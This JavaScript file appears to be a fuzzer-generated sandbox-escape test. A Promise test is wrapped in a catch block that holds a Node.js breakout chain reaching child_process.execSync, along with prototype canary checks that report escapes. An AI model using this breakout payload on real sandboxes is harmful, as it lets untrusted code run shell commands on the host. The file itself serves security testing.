try {
    var value = {};
    var reject;
    var thenable = new Promise(function (resolve) {
        let REPLACER = 23;
        resolve();
    });
    var p1 = new Promise(function (_, _reject) {
        let REPLACER = 23;
        reject = _reject;
    });
    var p2;
    thenable.then = function (resolve) {
        let REPLACER = 23;
        resolve(value);
    };
    p2 = p1.then(function () {
        let REPLACER = 23;
    }, function () {
        let REPLACER = 23;
        return thenable;
    });
    p2.then(function (x) {
        let REPLACER = 23;
        if (x !== value) {
            $DONE('The promise should be fulfilled with the resolution value of the provided promise.');
            return;
        }
        $DONE();
    }, function () {
        throw () => {
            return () => {
            };
        };
        $DONE('The promise should not be rejected.');
    });
    reject();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}